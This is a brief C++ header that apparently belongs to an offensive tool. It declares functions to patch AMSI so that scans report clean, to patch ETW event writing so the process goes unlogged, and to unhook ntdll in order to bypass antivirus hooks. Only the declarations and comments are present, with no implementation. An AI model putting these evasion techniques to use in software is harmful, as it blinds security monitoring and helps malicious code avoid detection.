#pragma once
#ifndef EVASION_H
#define EVASION_H
#include "common.h"

namespace Evasion {
    bool PatchAmsi();     // Patch AmsiScanBuffer in amsi.dll — always returns E_INVALIDARG (clean)
    bool PatchEtw();      // Patch EtwEventWrite in ntdll.dll — blind all ETW events from this process
    bool UnhookNtdll();   // Re-map ntdll .text from disk, overwriting any AV inline hooks
    std::string RunAll(); // Run all three; return status report
}

#endif
